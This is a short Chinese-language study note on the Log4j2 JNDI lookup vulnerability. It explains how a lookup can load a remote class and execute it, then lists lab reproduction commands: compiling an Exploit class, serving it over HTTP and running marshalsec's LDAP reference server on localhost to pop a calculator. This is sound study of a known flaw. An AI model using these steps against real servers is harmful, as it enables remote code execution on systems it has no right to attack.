### 0x01 漏洞原理
用我的理解简单概括一下  
log4j2在输出到日志的时候除了支持常见的变量替换还支持获取远程内容，获取远程内容由Lookups功能提供
```
# 变量替换
logger.info("user name: {}, alias name: {}", userName, aliasName)
```
获取远程内容支持多种维度，其中就包括jndi，如下图  
![image](./pic/Lookups.png)  
jndi简单讲就是一个类似于字典的数据集，传入名称，获取对应的对象，不过jndi还有一个危险的特性，就是可获取远程class或远程class的地址，加载到本地后通过classloader执行，这个时候如果用户传入一个包含恶意class的地址，则会导致服务器执行恶意代码，具体利用的话需要结合jndi支持的协议，jndi支持ladp、rmi、corba、dns四种协议，利用思路如下图  
![image](./pic/mindmap.png)  


### 0x02 漏洞复现
1、javac.exe .\Exploit.java  
2、python3.exe -m http.server 8800  
3、java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8800/#Exploit  

4、结果如下图  
![image](./pic/calc.png)  

### 参考链接
https://zhuanlan.zhihu.com/p/445646703h  
https://drun1baby.github.io/2022/07/28/Java反序列化之JNDI学习/  